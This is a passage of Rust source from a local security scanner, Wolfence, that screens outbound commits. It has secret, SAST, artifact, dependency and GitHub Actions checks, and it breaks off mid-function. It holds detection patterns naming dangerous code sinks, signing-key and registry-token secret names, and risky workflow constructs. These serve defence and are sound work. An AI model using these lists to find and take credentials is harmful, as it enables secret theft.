//! Built-in scanner interfaces and hardened local detector implementations.
//!
//! The scanner layer is the core of Wolfence's local-first judgment path. These
//! detectors are still heuristic, but they are intentionally structured:
//!
//! - path-aware file classification for obviously sensitive artifacts
//! - high-confidence secret signatures for known token families
//! - generic secret assignment heuristics with placeholder allowlists
//! - dependency intelligence focused on provenance, pinning quality, and lockfile posture
//!
//! The goal is not "match everything". The goal is "block the riskiest outbound
//! mistakes with explainable logic and acceptable false-positive rates."

use std::collections::{HashMap, HashSet};
use std::fs;
use std::path::{Path, PathBuf};

use serde_json::Value;

use crate::app::AppResult;

use super::config::REPO_CONFIG_RELATIVE_PATH;
use super::context::{ExecutionContext, ProtectedAction};
use super::findings::{Confidence, Finding, FindingCategory, Severity};
use super::git::{self, PushStatus};
use super::hooks::{self, HookLauncherKind, HookState};
use super::osv::{self, ResolvedDependency};
use super::receipt_policy::RECEIPT_POLICY_FILE_RELATIVE_PATH;
use super::receipts::RECEIPTS_DIR_RELATIVE_PATH;
use super::trust::TRUST_DIR_RELATIVE_PATH;

const MAX_TEXT_SCAN_BYTES: u64 = 512 * 1024;
const MAX_ARCHIVE_INSPECTION_BYTES: u64 = 8 * 1024 * 1024;

#[derive(Debug, Clone)]
pub enum ScannerProgress {
    FileStarted {
        scanner: &'static str,
        file: PathBuf,
        current: usize,
        total: usize,
    },
}

/// Shared behavior every scanner must provide.
pub trait Scanner {
    /// Stable scanner identifier for logs, policy, and finding attribution.
    fn name(&self) -> &'static str;
    /// Runs the scanner against the current execution context.
    #[allow(dead_code)]
    fn scan(&self, context: &ExecutionContext) -> AppResult<Vec<Finding>> {
        self.scan_with_progress(context, &mut |_| {})
    }

    /// Runs the scanner against the current execution context with optional
    /// per-file progress reporting.
    fn scan_with_progress(
        &self,
        context: &ExecutionContext,
        on_progress: &mut dyn FnMut(ScannerProgress),
    ) -> AppResult<Vec<Finding>>;
}

/// Secret detection using layered file and content heuristics.
pub struct SecretScanner;

/// Lightweight source pattern detection for obviously dangerous constructs.
pub struct BasicSastScanner;

/// Artifact and generated-file inspection for opaque outbound payloads.
pub struct ArtifactScanner;

/// Dependency and lockfile posture analysis.
pub struct DependencyScanner;

/// Configuration and infrastructure checks for unsafe defaults.
pub struct ConfigScanner;

/// Local Wolfence policy posture checks.
pub struct PolicyScanner;

impl Scanner for SecretScanner {
    fn name(&self) -> &'static str {
        "secret-scanner"
    }

    fn scan_with_progress(
        &self,
        context: &ExecutionContext,
        on_progress: &mut dyn FnMut(ScannerProgress),
    ) -> AppResult<Vec<Finding>> {
        let mut findings = Vec::new();
        let mut seen = HashSet::new();
        let total_files = context.candidate_files.len();

        for (index, file) in context.candidate_files.iter().enumerate() {
            on_progress(ScannerProgress::FileStarted {
                scanner: self.name(),
                file: file.clone(),
                current: index + 1,
                total: total_files,
            });
            let full_path = context.repo_root.join(file);

            if let Some(finding) = classify_sensitive_path(self.name(), file) {
                record_finding(&mut findings, &mut seen, finding);
            }

            let Some(contents) = read_text_file(&full_path)? else {
                continue;
            };
            let rust_test_line_mask = rust_test_line_mask(file, &contents);

            for (line_number, line) in contents.lines().enumerate() {
                let line_number = line_number + 1;
                if should_skip_line(&rust_test_line_mask, line_number) {
                    continue;
                }

                if let Some(finding) =
                    scan_private_key_headers(self.name(), file, line_number, line)
                {
                    record_finding(&mut findings, &mut seen, finding);
                }

                if let Some(finding) =
                    scan_private_key_assignment(self.name(), file, line_number, line)
                {
                    record_finding(&mut findings, &mut seen, finding);
                }

                for finding in scan_prefixed_secret_tokens(self.name(), file, line_number, line) {
                    record_finding(&mut findings, &mut seen, finding);
                }

                if let Some(finding) = scan_secret_assignment(self.name(), file, line_number, line)
                {
                    record_finding(&mut findings, &mut seen, finding);
                }

                if let Some(finding) = scan_credential_url(self.name(), file, line_number, line) {
                    record_finding(&mut findings, &mut seen, finding);
                }

                if let Some(finding) =
                    scan_registry_auth_credential(self.name(), file, line_number, line)
                {
                    record_finding(&mut findings, &mut seen, finding);
                }

                if let Some(finding) =
                    scan_inline_authorization_credential(self.name(), file, line_number, line)
                {
                    record_finding(&mut findings, &mut seen, finding);
                }

                if let Some(finding) =
                    scan_inline_secret_header(self.name(), file, line_number, line)
                {
                    record_finding(&mut findings, &mut seen, finding);
                }

                if let Some(finding) =
                    scan_connection_string_secret(self.name(), file, line_number, line)
                {
                    record_finding(&mut findings, &mut seen, finding);
                }

                if let Some(finding) =
                    scan_cookie_header_secret(self.name(), file, line_number, line)
                {
                    record_finding(&mut findings, &mut seen, finding);
                }

                if let Some(finding) =
                    scan_service_webhook_url(self.name(), file, line_number, line)
                {
                    record_finding(&mut findings, &mut seen, finding);
                }
            }
        }

        Ok(findings)
    }
}

impl Scanner for BasicSastScanner {
    fn name(&self) -> &'static str {
        "basic-sast"
    }

    fn scan_with_progress(
        &self,
        context: &ExecutionContext,
        on_progress: &mut dyn FnMut(ScannerProgress),
    ) -> AppResult<Vec<Finding>> {
        let mut findings = Vec::new();
        let total_files = context.candidate_files.len();

        for (index, file) in context.candidate_files.iter().enumerate() {
            on_progress(ScannerProgress::FileStarted {
                scanner: self.name(),
                file: file.clone(),
                current: index + 1,
                total: total_files,
            });
            let full_path = context.repo_root.join(file);

            let Some(contents) = read_text_file(&full_path)? else {
                continue;
            };
            let rust_test_line_mask = rust_test_line_mask(file, &contents);

            for (line_number, line) in contents.lines().enumerate() {
                let line_number = line_number + 1;
                if should_skip_line(&rust_test_line_mask, line_number) {
                    continue;
                }
                if let Some(finding) =
                    scan_remote_script_execution(self.name(), file, line_number, line)
                {
                    findings.push(finding);
                }
                if let Some(finding) =
                    scan_command_injection_pattern(self.name(), file, line_number, line)
                {
                    findings.push(finding);
                }
                if let Some(finding) = scan_ssrf_pattern(self.name(), file, line_number, line) {
                    findings.push(finding);
                }
                if let Some(finding) =
                    scan_path_traversal_pattern(self.name(), file, line_number, line)
                {
                    findings.push(finding);
                }
                if let Some(finding) =
                    scan_unsafe_deserialization_pattern(self.name(), file, line_number, line)
                {
                    findings.push(finding);
                }
                if let Some(finding) =
                    scan_sql_injection_pattern(self.name(), file, line_number, line)
                {
                    findings.push(finding);
                }
                if let Some(finding) =
                    scan_insecure_randomness_pattern(self.name(), file, line_number, line)
                {
                    findings.push(finding);
                }
                if let Some(finding) =
                    scan_unsafe_crypto_pattern(self.name(), file, line_number, line)
                {
                    findings.push(finding);
                }
                if let Some(finding) =
                    scan_file_upload_or_archive_extraction_pattern(
                        self.name(),
                        file,
                        line_number,
                        line,
                    )
                {
                    findings.push(finding);
                }
                if let Some(finding) =
                    scan_authz_bypass_pattern(self.name(), file, line_number, line)
                {
                    findings.push(finding);
                }
            }

            for (needle, title, detail, confidence) in [
                (
                    "eval(",
                    "Dynamic code execution pattern detected",
                    "The candidate file references `eval(`, which is a common source of code-injection risk.",
                    Confidence::Medium,
                ),
                (
                    "Runtime.getRuntime().exec",
                    "Command execution sink detected",
                    "The candidate file references a command-execution sink that often needs strict input validation.",
                    Confidence::Medium,
                ),
                (
                    "innerHTML",
                    "Raw HTML sink detected",
                    "The candidate file references `innerHTML`, which can create XSS risk when data is not sanitized.",
                    Confidence::Low,
                ),
            ] {
                if !generic_sast_pattern_applies_to_file(file, needle) {
                    continue;
                }

                if let Some(line_number) = contents.lines().enumerate().find_map(|(index, line)| {
                    let line_number = index + 1;
                    if should_skip_line(&rust_test_line_mask, line_number) || !line.contains(needle)
                    {
                        return None;
                    }

                    Some(line_number)
                }) {
                    findings.push(
                        Finding::new(
                            format!("sast.pattern.{needle}"),
                            self.name(),
                            Severity::Medium,
                            confidence,
                            FindingCategory::Vulnerability,
                            Some(file.clone()),
                            title,
                            detail,
                            "Confirm the input path is trusted or replace the construct with a safer pattern.",
                            format!("sast:{}:{needle}", file.display()),
                        )
                        .with_line(line_number),
                    );
                }
            }
        }

        Ok(findings)
    }
}

impl Scanner for ArtifactScanner {
    fn name(&self) -> &'static str {
        "artifact-scanner"
    }

    fn scan_with_progress(
        &self,
        context: &ExecutionContext,
        on_progress: &mut dyn FnMut(ScannerProgress),
    ) -> AppResult<Vec<Finding>> {
        let mut findings = Vec::new();
        let mut seen = HashSet::new();
        let total_files = context.candidate_files.len();

        for (index, file) in context.candidate_files.iter().enumerate() {
            on_progress(ScannerProgress::FileStarted {
                scanner: self.name(),
                file: file.clone(),
                current: index + 1,
                total: total_files,
            });
            let full_path = context.repo_root.join(file);
            let Some(metadata) = read_file_metadata(&full_path)? else {
                continue;
            };

            if !metadata.is_file() {
                continue;
            }

            let prefix = read_file_prefix(&full_path, 4096)?;

            if let Some(finding) = scan_archive_artifact(self.name(), file, &prefix) {
                record_finding(&mut findings, &mut seen, finding);
            }

            if looks_like_zip_style_archive(file, &prefix)
                && metadata.len() <= MAX_ARCHIVE_INSPECTION_BYTES
            {
                let bytes = fs::read(&full_path)?;
                for finding in scan_zip_style_archive_contents(self.name(), file, &bytes) {
                    record_finding(&mut findings, &mut seen, finding);
                }
            }

            if let Some(finding) = scan_compiled_binary_artifact(self.name(), file, &prefix) {
                record_finding(&mut findings, &mut seen, finding);
            }

            if let Some(finding) = scan_source_map_artifact(self.name(), file) {
                record_finding(&mut findings, &mut seen, finding);
            }

            let Some(contents) = read_text_file(&full_path)? else {
                continue;
            };

            if let Some(finding) = scan_minified_javascript_bundle(self.name(), file, &contents) {
                record_finding(&mut findings, &mut seen, finding);
            }

            if let Some(finding) = scan_minified_javascript_beaconing(self.name(), file, &contents)
            {
                record_finding(&mut findings, &mut seen, finding);
            }

            if let Some(finding) = scan_generated_asset_embedded_secret(
                self.name(),
                file,
                &contents,
            ) {
                record_finding(&mut findings, &mut seen, finding);
            }

            if let Some(finding) = scan_new_executable_text_artifact(
                self.name(),
                context,
                file,
                &metadata,
                &prefix,
                &contents,
            )? {
                record_finding(&mut findings, &mut seen, finding);
            }
        }

        Ok(findings)
    }
}

impl Scanner for DependencyScanner {
    fn name(&self) -> &'static str {
        "dependency-scanner"
    }

    fn scan_with_progress(
        &self,
        context: &ExecutionContext,
        on_progress: &mut dyn FnMut(ScannerProgress),
    ) -> AppResult<Vec<Finding>> {
        let mut findings = dependency_relationship_findings(self.name(), context)?;
        let mut seen = findings
            .iter()
            .map(|finding| finding.fingerprint.clone())
            .collect::<HashSet<_>>();
        let mut resolved_dependencies = Vec::new();
        let total_files = context.candidate_files.len();

        for (index, file) in context.candidate_files.iter().enumerate() {
            on_progress(ScannerProgress::FileStarted {
                scanner: self.name(),
                file: file.clone(),
                current: index + 1,
                total: total_files,
            });
            let full_path = context.repo_root.join(file);
            let Some(contents) = read_text_file(&full_path)? else {
                continue;
            };

            let path_text = file.to_string_lossy();
            let file_name = file
                .file_name()
                .and_then(|value| value.to_str())
                .unwrap_or_default();

            match file_name {
                "Cargo.toml" => {
                    for finding in scan_cargo_manifest(self.name(), file, &contents) {
                        record_finding(&mut findings, &mut seen, finding);
                    }
                }
                "config" | "config.toml"
                    if path_text.ends_with(".cargo/config")
                        || path_text.ends_with(".cargo/config.toml") =>
                {
                    for finding in scan_cargo_dependency_config(self.name(), file, &contents) {
                        record_finding(&mut findings, &mut seen, finding);
                    }
                }
                "Cargo.lock" => {
                    for finding in scan_cargo_lock(self.name(), file, &contents) {
                        record_finding(&mut findings, &mut seen, finding);
                    }
                    resolved_dependencies.extend(extract_cargo_lock_dependencies(file, &contents));
                }
                "package.json" => {
                    for finding in scan_package_json_manifest(self.name(), file, &contents) {
                        record_finding(&mut findings, &mut seen, finding);
                    }
                }
                ".npmrc" => {
                    for finding in scan_npmrc_dependency_config(self.name(), file, &contents) {
                        record_finding(&mut findings, &mut seen, finding);
                    }
                }
                "package-lock.json" | "npm-shrinkwrap.json" => {
                    for finding in scan_package_lock(self.name(), file, &contents) {
                        record_finding(&mut findings, &mut seen, finding);
                    }
                    resolved_dependencies.extend(extract_node_lock_dependencies(file, &contents));
                }
                "pnpm-lock.yaml" => {
                    for finding in scan_pnpm_lock(self.name(), file, &contents) {
                        record_finding(&mut findings, &mut seen, finding);
                    }
                    resolved_dependencies.extend(extract_pnpm_lock_dependencies(file, &contents));
                }
                "yarn.lock" => {
                    for finding in scan_yarn_lock(self.name(), file, &contents) {
                        record_finding(&mut findings, &mut seen, finding);
                    }
                    resolved_dependencies.extend(extract_yarn_lock_dependencies(file, &contents));
                }
                ".yarnrc.yml" | ".yarnrc.yaml" => {
                    for finding in scan_yarnrc_dependency_config(self.name(), file, &contents) {
                        record_finding(&mut findings, &mut seen, finding);
                    }
                }
                "go.mod" => {
                    for finding in scan_go_mod(self.name(), file, &contents) {
                        record_finding(&mut findings, &mut seen, finding);
                    }
                }
                "go.sum" => {
                    resolved_dependencies.extend(extract_go_sum_dependencies(file, &contents));
                }
                "Gemfile" | "gems.rb" => {
                    for finding in scan_gemfile(self.name(), file, &contents) {
                        record_finding(&mut findings, &mut seen, finding);
                    }
                }
                "Gemfile.lock" | "gems.locked" => {
                    for finding in scan_gemfile_lock(self.name(), file, &contents) {
                        record_finding(&mut findings, &mut seen, finding);
                    }
                    resolved_dependencies
                        .extend(extract_gemfile_lock_dependencies(file, &contents));
                }
                "pyproject.toml" => {
                    for finding in scan_pyproject(self.name(), file, &contents) {
                        record_finding(&mut findings, &mut seen, finding);
                    }
                }
                "poetry.lock" => {
                    for finding in scan_poetry_lock(self.name(), file, &contents) {
                        record_finding(&mut findings, &mut seen, finding);
                    }
                    resolved_dependencies.extend(extract_poetry_lock_dependencies(file, &contents));
                }
                "uv.lock" => {
                    for finding in scan_uv_lock(self.name(), file, &contents) {
                        record_finding(&mut findings, &mut seen, finding);
                    }
                    resolved_dependencies.extend(extract_uv_lock_dependencies(file, &contents));
                }
                "Pipfile.lock" => {
                    for finding in scan_pipfile_lock(self.name(), file, &contents) {
                        record_finding(&mut findings, &mut seen, finding);
                    }
                    resolved_dependencies
                        .extend(extract_pipfile_lock_dependencies(file, &contents));
                }
                "Pipfile" => {
                    for finding in scan_pipfile(self.name(), file, &contents) {
                        record_finding(&mut findings, &mut seen, finding);
                    }
                }
                _ => {
                    if file_name.starts_with("requirements") && path_text.ends_with(".txt") {
                        for finding in scan_requirements(self.name(), file, &contents) {
                            record_finding(&mut findings, &mut seen, finding);
                        }
                        resolved_dependencies
                            .extend(extract_requirements_dependencies(file, &contents));
                    }
                }
            }
        }

        for finding in dependency_confusion_findings(self.name(), context)? {
            record_finding(&mut findings, &mut seen, finding);
        }

        for finding in dependency_resolution_owner_host_findings(self.name(), context)? {
            record_finding(&mut findings, &mut seen, finding);
        }

        let osv_outcome = osv::scan_dependencies(context.action, resolved_dependencies)?;
        for finding in osv_outcome.findings {
            record_finding(&mut findings, &mut seen, finding);
        }

        if matches!(context.action, ProtectedAction::Push)
            && osv_outcome.mode != osv::OsvMode::Off
            && osv_outcome.attempted
            && osv_outcome.skipped_dependencies > 0
        {
            record_finding(
                &mut findings,
                &mut seen,
                Finding::new(
                    "dependency.osv.truncated-batch",
                    "osv-advisory-scanner",
                    Severity::Low,
                    Confidence::High,
                    FindingCategory::Policy,
                    None,
                    "OSV advisory batch was truncated",
                    format!(
                        "Wolfence queried {} exact-version dependencies against OSV and skipped {} additional dependencies to keep the live request bounded.",
                        osv_outcome.queried_dependencies, osv_outcome.skipped_dependencies
                    ),
                    "Reduce the dependency delta size or run additional scans after the current review cycle if you need broader live advisory coverage.",
                    "dependency-osv-truncated-batch",
                ),
            );
        }

        Ok(findings)
    }
}

impl Scanner for ConfigScanner {
    fn name(&self) -> &'static str {
        "config-scanner"
    }

    fn scan_with_progress(
        &self,
        context: &ExecutionContext,
        on_progress: &mut dyn FnMut(ScannerProgress),
    ) -> AppResult<Vec<Finding>> {
        let mut findings = Vec::new();
        let total_files = context.candidate_files.len();

        for (index, file) in context.candidate_files.iter().enumerate() {
            on_progress(ScannerProgress::FileStarted {
                scanner: self.name(),
                file: file.clone(),
                current: index + 1,
                total: total_files,
            });
            let full_path = context.repo_root.join(file);
            let file_name = file
                .file_name()
                .and_then(|value| value.to_str())
                .unwrap_or_default();
            let path_text = file.to_string_lossy();

            let is_config_like = file_name == "Dockerfile"
                || path_text.ends_with(".tf")
                || path_text.contains(".github/workflows")
                || path_text.contains(".github/rulesets/")
                || path_text == ".github/settings.yml"
                || path_text == ".github/settings.yaml"
                || path_text == ".github/repository.yml"
                || path_text == ".github/repository.yaml"
                || path_text.ends_with(".yaml")
                || path_text.ends_with(".yml");

            if !is_config_like {
                continue;
            }

            let Some(contents) = read_text_file(&full_path)? else {
                continue;
            };

            for (needle, title) in [
                (
                    "privileged: true",
                    "Privileged container configuration detected",
                ),
                ("0.0.0.0/0", "Wide-open network exposure detected"),
                (
                    "sudo: required",
                    "Elevated CI runner configuration detected",
                ),
            ] {
                if contents.contains(needle)
                    && !(needle == "privileged: true" && looks_like_kubernetes_manifest(&contents))
                {
                    findings.push(Finding::new(
                        format!("config.pattern.{needle}"),
                        self.name(),
                        Severity::High,
                        Confidence::Medium,
                        FindingCategory::Configuration,
                        Some(file.clone()),
                        title,
                        format!("The candidate configuration contains `{needle}`."),
                        "Confirm the exposure is intentional and add a narrowly scoped justification or safer configuration.",
                        format!("config:{}:{needle}", file.display()),
                    ));
                }
            }

            if path_text.contains(".github/workflows") {
                findings.extend(scan_github_actions_workflow(self.name(), file, &contents));
            }

            if is_github_repo_governance_file(file) {
                findings.extend(scan_github_repo_governance_config(
                    self.name(),
                    file,
                    &contents,
                ));
            }

            if file_name == "Dockerfile" {
                findings.extend(scan_dockerfile(self.name(), file, &contents));
            }

            if path_text.ends_with(".tf") {
                findings.extend(scan_terraform_iac_config(self.name(), file, &contents));
            }

            findings.extend(scan_kubernetes_runtime_config(self.name(), file, &contents));

            if let Some(finding) = scan_kubernetes_secret_manifest(self.name(), file, &contents) {
                findings.push(finding);
            }
        }

        Ok(findings)
    }
}

fn scan_github_actions_workflow(
    scanner: &'static str,
    file: &Path,
    contents: &str,
) -> Vec<Finding> {
    let mut findings = Vec::new();
    let lower = contents.to_ascii_lowercase();
    let has_pull_request_target = lower.contains("pull_request_target");
    let has_pull_request = contents.lines().any(|line| {
        let trimmed = line.trim();
        trimmed.starts_with("pull_request:")
            || trimmed.starts_with("\"pull_request\"")
            || trimmed == "pull_request"
    });
    let has_workflow_dispatch = contents.lines().any(|line| {
        let trimmed = line.trim();
        trimmed.starts_with("workflow_dispatch:")
            || trimmed.starts_with("\"workflow_dispatch\"")
            || trimmed == "workflow_dispatch"
    });
    let has_repository_dispatch = contents.lines().any(|line| {
        let trimmed = line.trim();
        trimmed.starts_with("repository_dispatch:")
            || trimmed.starts_with("\"repository_dispatch\"")
            || trimmed == "repository_dispatch"
    });
    let has_release_trigger = contents.lines().any(|line| {
        let trimmed = line.trim();
        trimmed.starts_with("release:")
            || trimmed.starts_with("\"release\"")
            || trimmed == "release"
    });
    let has_push_trigger = contents.lines().any(|line| {
        let trimmed = line.trim();
        trimmed.starts_with("push:") || trimmed.starts_with("\"push\"") || trimmed == "push"
    });
    let has_tag_filter = contents.lines().any(|line| {
        let trimmed = line.trim();
        trimmed.starts_with("tags:") || trimmed.starts_with("\"tags\"") || trimmed == "tags"
    });
    let has_attestation_step = lower.contains("actions/attest-build-provenance@");
    let has_id_token_write = lower.contains("id-token: write");
    let has_attestations_write = lower.contains("attestations: write");
    let docker_build_push_line = contents
        .lines()
        .enumerate()
        .find_map(|(index, line)| {
            line.trim()
                .to_ascii_lowercase()
                .contains("uses: docker/build-push-action@")
                .then_some(index + 1)
        });
    let docker_login_line = contents.lines().enumerate().find_map(|(index, line)| {
        line.trim()
            .to_ascii_lowercase()
            .contains("uses: docker/login-action@")
            .then_some(index + 1)
    });
    let docker_push_line = contents.lines().enumerate().find_map(|(index, line)| {
        let trimmed = line.trim().to_ascii_lowercase();
        if trimmed == "push: true"
            || trimmed == "\"push\": true"
            || trimmed.contains("push=true")
            || trimmed.contains("push: \"true\"")
            || trimmed.contains("push: 'true'")
        {
            Some(index + 1)
        } else {
            None
        }
    });
    let docker_provenance_line = contents.lines().enumerate().find_map(|(index, line)| {
        let trimmed = line.trim().to_ascii_lowercase();
        if trimmed == "provenance: true"
            || trimmed.contains("provenance=true")
            || trimmed.contains("provenance: mode=")
            || trimmed.contains("provenance: max")
            || trimmed.contains("provenance: min")
            || trimmed.contains("provenance: \"mode=")
            || trimmed.contains("provenance: 'mode=")
        {
            Some(index + 1)
        } else {
            None
        }
    });
    let trusted_publishing_line = contents.lines().enumerate().find_map(|(index, line)| {
        let trimmed = line.trim().to_ascii_lowercase();
        let is_npm_trusted_publishing = (trimmed.starts_with("run:")
            || trimmed.starts_with("- run:"))
            && trimmed.contains("publish")
            && trimmed.contains("--provenance");
        let is_pypi_trusted_publishing =
            trimmed.contains("uses: pypa/gh-action-pypi-publish@");

        if is_npm_trusted_publishing || is_pypi_trusted_publishing {
            Some(index + 1)
        } else {
            None
        }
    });
    let keyless_signing_line = contents.lines().enumerate().find_map(|(index, line)| {
        let trimmed = line.trim().to_ascii_lowercase();
        let is_cosign_keyless = (trimmed.starts_with("run:") || trimmed.starts_with("- run:"))
            && (trimmed.contains("cosign sign") || trimmed.contains("cosign attest"))
            && trimmed.contains("--keyless");
        let is_sigstore_keyless = (trimmed.starts_with("run:") || trimmed.starts_with("- run:"))
            && trimmed.contains("sigstore sign")
            && (trimmed.contains("--oidc") || trimmed.contains("--identity-token"));

        if is_cosign_keyless || is_sigstore_keyless {
            Some(index + 1)
        } else {
            None
        }
    });
    let signing_activity_line = contents.lines().enumerate().find_map(|(index, line)| {
        let trimmed = line.trim().to_ascii_lowercase();
        let has_signing_activity = [
            "cosign sign",
            "cosign attest",
            "gpg --detach-sign",
            "gpg --armor --detach-sign",
            "gpg --clearsign",
            "gpg --import",
            "minisign -s",
            "signify -s",
            "codesign ",
        ]
        .iter()
        .any(|needle| trimmed.contains(needle));

        has_signing_activity.then_some(index + 1)
    });
    let long_lived_signing_credential_line =
        contents.lines().enumerate().find_map(|(index, line)| {
            let trimmed = line.trim().to_ascii_lowercase();
            if trimmed.starts_with('#') || !trimmed.contains("secrets.") {
                return None;
            }

            let has_signing_secret_signal = [
                "cosign_private_key",
                "cosign_password",
                "gpg_private_key",
                "gpg_passphrase",
                "signing_key",
                "signing_private_key",
                "signing_passphrase",
                "minisign_secret_key",
                "signify_secret_key",
                "codesign_certificate",
                "apple_certificate",
                "apple_cert_password",
                "notarytool_password",
            ]
            .iter()
            .any(|needle| trimmed.contains(needle));

            has_signing_secret_signal.then_some(index + 1)
        });
    let has_trusted_publishing_signal = trusted_publishing_line.is_some();
    let has_oci_provenance_signal = docker_build_push_line.is_some() && docker_provenance_line.is_some();
    let has_provenance_signal = has_attestation_step
        || has_trusted_publishing_signal
        || has_oci_provenance_signal
        || lower.contains("cosign sign")
        || lower.contains("cosign attest")
        || lower.contains("gh attestation")
        || lower.contains("slsa-github-generator")
        || lower.contains("sigstore");
    let attestation_line = find_line_number(contents, "actions/attest-build-provenance@");
    let workflow_run_line = find_trigger_line(contents, "workflow_run");
    let has_untrusted_pr_trigger = has_pull_request_target || has_pull_request;
    let checkout_line = find_line_number(contents, "uses: actions/checkout@");
    let head_reference_line = find_line_number(contents, "github.event.pull_request.head");
    let persist_credentials_disabled = lower.contains("persist-credentials: false");
    let dispatch_ref_line = contents.lines().enumerate().find_map(|(index, line)| {
        let lowered = line.to_ascii_lowercase();
        if lowered.contains("github.event.inputs.")
            || lowered.contains("inputs.")
            || lowered.contains("github.event.client_payload.")
        {
            Some(index + 1)
        } else {
            None
        }
    });
    let release_ref_line = find_line_number(contents, "github.event.release.target_commitish");
    let mutable_release_branch_ref_line = contents.lines().enumerate().find_map(|(index, line)| {
        let trimmed = line.trim().to_ascii_lowercase();
        if !trimmed.starts_with("ref:") {
            return None;
        }

        let reference = trimmed.trim_start_matches("ref:").trim();
        if reference == "main"
            || reference == "master"
            || reference == "develop"
            || reference == "development"
            || reference == "trunk"
            || reference.starts_with("refs/heads/")
            || reference.contains("github.event.repository.default_branch")
        {
            Some(index + 1)
        } else {
            None
        }
    });
    let download_artifact_line = find_line_number(contents, "uses: actions/download-artifact@");
    let secrets_inherit_line = contents.lines().enumerate().find_map(|(index, line)| {
        let trimmed = line.trim().to_ascii_lowercase();
        if trimmed == "secrets: inherit" || trimmed == "\"secrets\": \"inherit\"" {
            Some(index + 1)
        } else {
            None
        }
    });
    let unsecure_commands_line = contents.lines().enumerate().find_map(|(index, line)| {
        let trimmed = line.trim().to_ascii_lowercase();
        if trimmed.contains("actions_allow_unsecure_commands")
            && (trimmed.contains(": true")
                || trimmed.contains("=true")
                || trimmed.contains(": \"true\"")
                || trimmed.contains(": 'true'"))
        {
            Some(index + 1)
        } else {
            None
        }
    });
    let self_hosted_line = contents.lines().enumerate().find_map(|(index, line)| {
        let trimmed = line.trim().to_ascii_lowercase();
        if trimmed.contains("runs-on") && trimmed.contains("self-hosted")
            || (trimmed.starts_with("- self-hosted") && has_untrusted_pr_trigger)
        {
            Some(index + 1)
        } else {
            None
        }
    });
    let artifact_execution_line = contents.lines().enumerate().find_map(|(index, line)| {
        let trimmed = line.trim().to_ascii_lowercase();
        if !trimmed.starts_with("run:") && !trimmed.starts_with("- run:") {
            return None;
        }

        let downloads_or_build_outputs = [
            "artifact",
            "artifacts",
            "dist/",
            "build/",
            "release/",
            "download",
            "out/",
        ]
        .iter()
        .any(|needle| trimmed.contains(needle));
        let executes_payload = trimmed.contains("chmod +x")
            || trimmed.contains("./")
            || trimmed.contains("bash ")
            || trimmed.contains("sh ")
            || trimmed.contains("python ")
            || trimmed.contains("node ")
            || trimmed.contains("pwsh ")
            || trimmed.contains("powershell ");
        if downloads_or_build_outputs && executes_payload {
            Some(index + 1)
        } else {
            None
        }
    });
    let publish_line = contents.lines().enumerate().find_map(|(index, line)| {
        let trimmed = line.trim().to_ascii_lowercase();
        let has_publish_command = [
            "cargo publish",
            "npm publish",
            "pnpm publish",
            "yarn publish",
            "twine upload",
            "docker push",
            "gh release create",
            "gem push",
            "goreleaser release",
            "semantic-release",
        ]
        .iter()
        .any(|needle| trimmed.contains(needle));
        let has_publish_action = trimmed.contains("uses: pypa/gh-action-pypi-publish@")
            || trimmed.contains("uses: goreleaser/goreleaser-action@")
            || trimmed.contains("uses: cycjimmy/semantic-release-action@")
            || trimmed.contains("uses: codfish/semantic-release-action@")
            || trimmed.contains("uses: softprops/action-gh-release@")
            || trimmed.contains("uses: ncipollo/release-action@")
            || trimmed.contains("uses: actions/create-release@");

        (has_publish_command || has_publish_action).then_some(index + 1)
    });
    let release_publication_line = contents.lines().enumerate().find_map(|(index, line)| {
        let trimmed = line.trim().to_ascii_lowercase();
        let has_release_command = trimmed.contains("gh release create");
        let has_release_action = trimmed.contains("uses: softprops/action-gh-release@")
            || trimmed.contains("uses: goreleaser/goreleaser-action@")
            || trimmed.contains("uses: cycjimmy/semantic-release-action@")
            || trimmed.contains("uses: codfish/semantic-release-action@")
            || trimmed.contains("uses: ncipollo/release-action@")
            || trimmed.contains("uses: actions/create-release@");

        (has_release_command || has_release_action).then_some(index + 1)
    });
    let long_lived_publish_credential_line = contents.lines().enumerate().find_map(|(index, line)| {
        let trimmed = line.trim().to_ascii_lowercase();
        if trimmed.starts_with('#') {
            return None;
        }

        let has_secret_reference = trimmed.contains("secrets.");
        let has_registry_credential_signal = [
            "node_auth_token",
            "npm_token",
            "npm_auth_token",
            "pypi_api_token",
            "twine_password",
            "poetry_pypi_token",
            "cargo_registry_token",
            "cargo_token",
            "crates_io_token",
            "gem_host_api_key",
            "rubygems_api_key",
            "docker_password",
            "dockerhub_token",
            "ghcr_token",
            "registry_token",
        ]
        .iter()
        .any(|needle| trimmed.contains(needle));

        if has_secret_reference && has_registry_credential_signal {
            Some(index + 1)
        } else {
            None
        }
    });
    let long_lived_release_credential_line = contents.lines().enumerate().find_map(|(index, line)| {
        let trimmed = line.trim().to_ascii_lowercase();
        if trimmed.starts_with('#') || !trimmed.contains("secrets.") {
            return None;
        }

        let has_release_credential_signal = [
            "github_token",
            "gh_token",
            "github_pat",
            "gh_pat",
            "personal_access_token",
            "release_token",
            "repo_token",
        ]
        .iter()
        .any(|needle| trimmed.contains(needle));

        has_release_credential_signal.then_some(index + 1)
    });
    let tag_creation_line = contents.lines().enumerate().find_map(|(index, line)| {
        let trimmed = line.trim().to_ascii_lowercase();
        if (trimmed.starts_with("run:") || trimmed.starts_with("- run:"))
            && trimmed.contains("git tag")
        {
            Some(index + 1)
        } else {
            None
        }
    });
    let tag_push_line = contents.lines().enumerate().find_map(|(index, line)| {
        let trimmed = line.trim().to_ascii_lowercase();
        if (trimmed.starts_with("run:") || trimmed.starts_with("- run:"))
            && trimmed.contains("git push")
            && (trimmed.contains("--tags") || trimmed.contains("refs/tags"))
        {
            Some(index + 1)
        } else {
            None
        }
    });

    if lower.contains("permissions: write-all") || lower.contains("\"permissions\": \"write-all\"")
    {
        findings.push(
            Finding::new(
            "config.github-actions.permissions-write-all",
            scanner,
            Severity::High,
            Confidence::High,
            FindingCategory::Configuration,
            Some(file.to_path_buf()),
            "GitHub Actions workflow grants write-all token permissions",
            "The candidate workflow sets `permissions: write-all`, which broadly expands `GITHUB_TOKEN` write access across scopes.",
            "Reduce workflow permissions to the minimum required scopes and prefer explicit per-scope permissions instead of `write-all`.",
            format!("config-github-actions-write-all:{}", file.display()),
        )
        .with_line(find_line_number(contents, "permissions: write-all").unwrap_or(1)),
        );
    }

    if has_pull_request_target {
        let (severity, confidence, detail, remediation, fingerprint_suffix) = if lower
            .contains("github.event.pull_request.head")
        {
            (
                Severity::High,
                Confidence::High,
                "The candidate workflow uses `pull_request_target` and also references pull-request head content, which can create a privileged path for untrusted code or artifacts.",
